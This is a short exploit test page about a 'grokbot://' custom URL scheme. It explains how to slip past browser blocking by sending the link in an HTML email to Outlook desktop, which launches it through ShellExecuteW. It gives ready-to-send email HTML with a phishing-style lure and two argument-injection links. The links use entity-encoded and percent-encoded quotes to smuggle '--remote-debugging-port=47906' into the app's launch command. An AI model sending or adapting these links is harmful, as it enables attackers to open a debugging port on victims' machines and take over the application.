Grok Bot - Email Delivery Test

The Problem

Clicking a link to this webpage from email opens it in a browser. Browsers block " in custom scheme URLs (GURL validation). So the exploit link on the page doesn't fire.

For email delivery, the grokbot:// URL must be the direct href in the email HTML, so the email client (Outlook desktop) dispatches it via ShellExecuteW — bypassing the browser entirely.

Test Links (click from THIS page)

These test the browser's behavior. They will likely be blocked by GURL. This page exists to verify that.

How to Test Email Delivery

Copy the HTML below and send it as an HTML email (not plain text). Open in Outlook Desktop (classic) and click the link.

Email HTML to copy:

<html>
<body>
<p>Hi, check out this Grok Bot feature:</p>

<!-- Test 1: HTML entity &quot; for the quote character -->
<p><a href="grokbot://x&quot; --remote-debugging-port=47906 &quot;--y=z">
  Open in Grok Bot (Test 1 - entity)
</a></p>

<!-- Test 2: Percent-encoded %22 for quote -->
<p><a href="grokbot://x%22 --remote-debugging-port=47906 %22--y=z">
  Open in Grok Bot (Test 2 - %22)
</a></p>

<!-- Test 3: Clean link (control) -->
<p><a href="grokbot://app/v1/open">
  Open Grok Bot (Test 3 - clean control)
</a></p>

<p>Thanks!</p>
</body>
</html>
